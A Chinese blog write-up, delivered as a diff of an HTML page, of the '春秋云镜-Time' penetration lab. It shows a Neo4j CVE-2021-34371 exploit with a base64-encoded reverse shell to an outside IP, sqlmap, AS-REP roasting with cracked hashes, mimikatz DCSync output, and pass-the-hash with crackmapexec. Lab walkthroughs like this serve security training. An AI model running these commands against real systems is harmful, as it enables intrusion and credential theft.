@@ -1,0 +1,229 @@
+<!DOCTYPE html><html lang="zn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云镜-Time | A day in AsaL1n</title><meta name="author" content="AsaL1n"><meta name="copyright" content="AsaL1n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="春秋云镜-Time外网 nmap扫描端口 只扫描出来22端口 令我很是疑惑  用goby进行信息收集  注意到开启了7474端口 直接访问  存在Neo4j shell 漏洞 CVE-2021-34371 脚本一把梭 1java -jar rhino_gadget-1.0-SNAPSHOT-fatjar.jar rmi:&#x2F;&#x2F;39.98.127.126:1337 &quot;bash -c &amp;#12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Time">
+<meta property="og:url" content="https://asal1n.github.io/2024/07/12/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/index.html">
+<meta property="og:site_name" content="A day in AsaL1n">
+<meta property="og:description" content="春秋云镜-Time外网 nmap扫描端口 只扫描出来22端口 令我很是疑惑  用goby进行信息收集  注意到开启了7474端口 直接访问  存在Neo4j shell 漏洞 CVE-2021-34371 脚本一把梭 1java -jar rhino_gadget-1.0-SNAPSHOT-fatjar.jar rmi:&#x2F;&#x2F;39.98.127.126:1337 &quot;bash -c &amp;#12">
+<meta property="og:locale">
+<meta property="og:image" content="https://asal1n.github.io/img/head.jpg">
+<meta property="article:published_time" content="2024-07-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-07-12T12:44:26.820Z">
+<meta property="article:author" content="AsaL1n">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://asal1n.github.io/img/head.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://asal1n.github.io/2024/07/12/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '春秋云镜-Time',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-12 20:44:26'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">51</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页/Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线/Footprints</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友们/Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于/About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.svg')"><nav id="nav"><span id="blog-info"><a href="/" title="A day in AsaL1n"><span class="site-name">A day in AsaL1n</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页/Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线/Footprints</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友们/Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于/About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">春秋云镜-Time</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-07-11T16:00:00.000Z" title="Created 2024-07-12 00:00:00">2024-07-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-12T12:44:26.820Z" title="Updated 2024-07-12 20:44:26">2024-07-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="春秋云镜-Time"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="春秋云镜-Time"><a href="#春秋云镜-Time" class="headerlink" title="春秋云镜-Time"></a>春秋云镜-Time</h1><h2 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h2><blockquote>
+<p>nmap扫描端口 只扫描出来22端口 令我很是疑惑</p>
+</blockquote>
+<p>用goby进行信息收集</p>
+<p><img src="/../../../../img/image-20240712134256749.png" alt="image-20240712134256749"></p>
+<p>注意到开启了7474端口 直接访问</p>
+<p><img src="/../../../../img/image-20240712132223257.png" alt="image-20240712132223257"></p>
+<p>存在Neo4j shell 漏洞 CVE-2021-34371 脚本一把梭</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar rhino_gadget-1.0-SNAPSHOT-fatjar.jar rmi://39.98.127.126:1337 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMjI5LjIwMi4xNjQvMzIzMiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell</p>
+<p><img src="/../../../../img/image-20240712134435532.png" alt="image-20240712134435532"></p>
+<p>在tmp目录下上传fscan</p>
+<p>查看当前网段</p>
+<p><img src="/../../../../img/image-20240712135706251.png" alt="image-20240712135706251"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当前内网IP 172.22.6.36</span><br><span class="line">./fscan  -h 177.22.6.36/16 &gt;&gt; out.txt</span><br></pre></td></tr></table></figure>
+
+<p>找到以下主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] 172.22.6.12    [+]DC XIAORANG\DC-PROGAME        Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] 172.22.6.25          XIAORANG\WIN2019       </span><br><span class="line">[*] 172.22.6.12 (Windows Server 2016 Datacenter 14393)</span><br></pre></td></tr></table></figure>
+
+<h2 id="172-22-6-38"><a href="#172-22-6-38" class="headerlink" title="172.22.6.38"></a>172.22.6.38</h2><p>访问得到 一个登录界面</p>
+<p><img src="/../../../../img/image-20240712151453815.png" alt="image-20240712151453815"></p>
+<p>抓包 sqlmap一把梭</p>
+<p><img src="/../../../../img/image-20240712151512767.png" alt="image-20240712151512767"></p>
+<p>得到flag</p>
+<p><img src="/../../../../img/image-20240712151523201.png" alt="image-20240712151523201"></p>
+<p>保存到本地</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_users.csv</span><br></pre></td></tr></table></figure>
+
+<h2 id="172-22-6-25"><a href="#172-22-6-25" class="headerlink" title="172.22.6.25"></a>172.22.6.25</h2><p>吧数据库里面的数据拿出来 取出里面的email</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_csv(<span class="string">&quot;D:\\Desktop\\1.txt&quot;</span>)</span><br><span class="line">emails = df[<span class="string">&#x27;email&#x27;</span>]</span><br><span class="line">emails.to_csv(<span class="string">&#x27;D:\\Desktop\\user.txt&#x27;</span>, index=<span class="literal">False</span>, header=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>枚举域用户</p>
+<p><img src="/../../../../img/image-20240712154013796.png" alt="image-20240712154013796"></p>
+<p>跑了蛮久的 得到74个潜在用户<br><img src="/../../../../img/image-20240712154731271.png" alt="image-20240712154731271"></p>
+<p>寻找是否存在Kerberos 预身份验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-GetNPUsers -dc-ip 172.22.6.12  xiaorang.lab/  -usersfile 1.txt  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../img/image-20240712155137529.png" alt="image-20240712155137529"></p>
+<p>得到俩</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:e8d57242c5a0acce5dc17294d7ab95b6$d4c4382d9656efc3281fbea5e14d73c86312b82e047d0ad5697f5477ca5ecd7a7e83f418dc040ca3757f7aa29fa948b5110ef06de83b653cff96b74c4ce02fc110b5d6c6782c791c336665be5a98bf74251fc40626253a491bcdfb7c095fda9b4b94e74aa00d6e7159be6dc0d29108e2fb37b2ca77e584fc292f62ebe4df20030af43c7de08ccb956f41e07154dd3bf1cdde54c0918f85fd6bc2af479e51e59df633cdf2bcb3045f679c1010e5f692fe5314dec9ed832e2a83d75c9a44e7fe26763a238bdf84628e91964f942dbbfe4ddc1a4fc74b09ac3938cc282ee6f972f685cd54507b054fcb31c9b07c</span><br><span class="line"></span><br><span class="line">$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:a3b1755db50481fd9708547650044b58$b16dfd961e5e55b08a2216f2f836c08c8f7b55c68030d7c642a2a3dd1df902dea07552b9fd33e0470ce456b11454b0b7559b48a98df111980cb46a1be49005f7686e0da471e87a8cf1be00806bbf756f69900455c137351dcd460b20e7b4b88e53bbf23d4d8af01f369858ca12b8b7dae5368ec34d51a1417799a64295a122897587679eee1229806e279429ee226e03eeb46a8dd449541561e35c2c5cbe2b4a3c656533ee985c79fc6bcaec09e23ab7e8603de105d281b247c33eee0018fd95d4685d5055072c52b59949f871e99548697aec4ad24b5001ffc61636fed599294277f2d54e35dfd3e1d03e2d</span><br></pre></td></tr></table></figure>
+
+<p>使用john爆破</p>
+<p><img src="/../../../../img/image-20240712155409432.png" alt="image-20240712155409432"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hellokitty strawberry</span><br></pre></td></tr></table></figure>
+
+<p>尝试远程连接</p>
+<p><img src="/../../../../img/image-20240712155959536.png" alt="image-20240712155959536"></p>
+<p>成功远程连接</p>
+<p>上传SharpHound 收集信息 得到域关系</p>
+<p><img src="/../../../../img/image-20240712160606804.png" alt="image-20240712160606804"></p>
+<p>上传生成的shell.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# msfvenom -p windows/meterpreter/bind_tcp -f exe -o shell.exe </span><br></pre></td></tr></table></figure>
+
+<p>抓取自动登录密码<a href="mailto:&#121;&#x75;&#120;&#x75;&#97;&#110;&#64;&#x78;&#105;&#97;&#x6f;&#114;&#x61;&#x6e;&#103;&#46;&#x6c;&#97;&#98;">&#121;&#x75;&#120;&#x75;&#97;&#110;&#64;&#x78;&#105;&#97;&#x6f;&#114;&#x61;&#x6e;&#103;&#46;&#x6c;&#97;&#98;</a> &#x2F;Yuxuan7QbrgZ3L</p>
+<p>成功连接</p>
+<p><img src="/../../../../img/image-20240712161141563.png" alt="image-20240712161141563"></p>
+<p>上传mimikatz 抓取hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x86) #18362 Feb 29 2020 11:13:10</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::dcsync /domain:xiaorang.lab /user:Administrator</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC-PROGAME.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;Administrator&#x27; will be the user account</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : Administrator</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000200 ( NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   : 1601/1/1 8:00:00</span><br><span class="line">Password last change : 2024/7/12 13:17:58</span><br><span class="line">Object Security ID   : S-1-5-21-3623938633-4064111800-2925858365-500</span><br><span class="line">Object Relative ID   : 500</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 04d93ffd6f5f6e4490e0de23f240a5e9</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 3d7213fe1e4f2e8f1f2831330f2aa114</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : XIAORANG.LABAdministrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : a7c1e1940765d04f18ac3a43d09588e96af827808f921e5855730a2a050ef007</span><br><span class="line">      aes128_hmac       (4096) : 3c7453f1f392a7f8c1af77696a160f2d</span><br><span class="line">      des_cbc_md5       (4096) : a8e0b35eefe9d3d0</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (4096) : a7c1e1940765d04f18ac3a43d09588e96af827808f921e5855730a2a050ef007</span><br><span class="line">      aes128_hmac       (4096) : 3c7453f1f392a7f8c1af77696a160f2d</span><br><span class="line">      des_cbc_md5       (4096) : a8e0b35eefe9d3d0</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : XIAORANG.LABAdministrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : a8e0b35eefe9d3d0</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : a8e0b35eefe9d3d0</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    01  0f7990fa51442d1fc1b9f5703b7a9f53</span><br><span class="line">    02  f8f3ab7a545c3df42068692e22e5fd1a</span><br><span class="line">    03  63b49f8e791de04010e0d3838864fb5d</span><br><span class="line">    04  0f7990fa51442d1fc1b9f5703b7a9f53</span><br><span class="line">    05  7c94fce5f59a52edc7c941683f529315</span><br><span class="line">    06  db3d41291d2865f07788fcd0878e9048</span><br><span class="line">    07  8cffc17d1ac652e058047f177988f94f</span><br><span class="line">    08  e0204b55258553e92222b39548b6bf64</span><br><span class="line">    09  c024e8558b548d9ed0dac80cb3937227</span><br><span class="line">    10  a55582f6895260bfb4c18eccc5e43639</span><br><span class="line">    11  23cd59de8b7fc224a076a0f3001afbfa</span><br><span class="line">    12  e0204b55258553e92222b39548b6bf64</span><br><span class="line">    13  b4716b4fe3233db5dd79d97fe470a11b</span><br><span class="line">    14  b6b21073a6bd20a1ef665cbdf3633bc9</span><br><span class="line">    15  472854e67b07839a52b40ddeec245582</span><br><span class="line">    16  d47433701f75461a006ab9a73a7ba33b</span><br><span class="line">    17  7655b2aeae13a52426da7558382f1e98</span><br><span class="line">    18  3c384e9401eb1d0467ee29affd959e98</span><br><span class="line">    19  a68e52c5f665ac7f178061a140670af0</span><br><span class="line">    20  51a1204a8e37e806fdfb16f0c2ffd7cb</span><br><span class="line">    21  014900de757e1f20310d8c0d1fb1d812</span><br><span class="line">    22  3f683ca0caafbd5e4dee3b919901066d</span><br><span class="line">    23  b12255387f518480c552971cbab71ac1</span><br><span class="line">    24  6c1b44f40c541a959d45423231dccef4</span><br><span class="line">    25  c18dd5d14b73706c6abc66233f42ada8</span><br><span class="line">    26  11a8ab9dc7e507ee0d99d3295f7c9e06</span><br><span class="line">    27  d5ab194a6f297a6565e230ce525f0539</span><br><span class="line">    28  3b50d0aa5201e3e934bccbe200010ddb</span><br><span class="line">    29  97bafc631fb4dfe596c1a2c5e0ad19e5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>此时得到administer 的 hash  使用hash传递连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.6.12 -u administrator -H04d93ffd6f5f6e4490e0de23f240a5e9 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag04.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../img/image-20240712161537817.png" alt="image-20240712161537817"></p>
+<p>没看到其他信息了 尝试能不能直接访问dc 传递hash得到flag</p>
+<h2 id="172-22-6-12"><a href="#172-22-6-12" class="headerlink" title="172.22.6.12"></a>172.22.6.12</h2><p>传递hash得到flag</p>
+<p><img src="/../../../../img/image-20240712162347004.png" alt="image-20240712162347004"></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/07/11/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/" title="春秋云镜-Initial"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">春秋云镜-Initial</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">AsaL1n</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">51</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/AsaL1n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">why we need that??</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time"><span class="toc-number">1.</span> <span class="toc-text">春秋云镜-Time</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91"><span class="toc-number">1.1.</span> <span class="toc-text">外网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#172-22-6-38"><span class="toc-number">1.2.</span> <span class="toc-text">172.22.6.38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#172-22-6-25"><span class="toc-number">1.3.</span> <span class="toc-text">172.22.6.25</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#172-22-6-12"><span class="toc-number">1.4.</span> <span class="toc-text">172.22.6.12</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/12/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/" title="春秋云镜-Time">春秋云镜-Time</a><time datetime="2024-07-11T16:00:00.000Z" title="Created 2024-07-12 00:00:00">2024-07-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/11/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/" title="春秋云镜-Initial">春秋云镜-Initial</a><time datetime="2024-07-10T16:00:00.000Z" title="Created 2024-07-11 00:00:00">2024-07-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/10/HTB%20season/" title="HTB PERMX">HTB PERMX</a><time datetime="2024-07-09T16:00:00.000Z" title="Created 2024-07-10 00:00:00">2024-07-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/08/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20thinkphp/" title="php代码审计-Thinkphp&lt;5.*">php代码审计-Thinkphp&lt;5.*</a><time datetime="2024-07-07T16:00:00.000Z" title="Created 2024-07-08 00:00:00">2024-07-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/06/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024 春秋杯 wp">2024 春秋杯 wp</a><time datetime="2024-07-05T16:00:00.000Z" title="Created 2024-07-06 00:00:00">2024-07-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By AsaL1n</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" 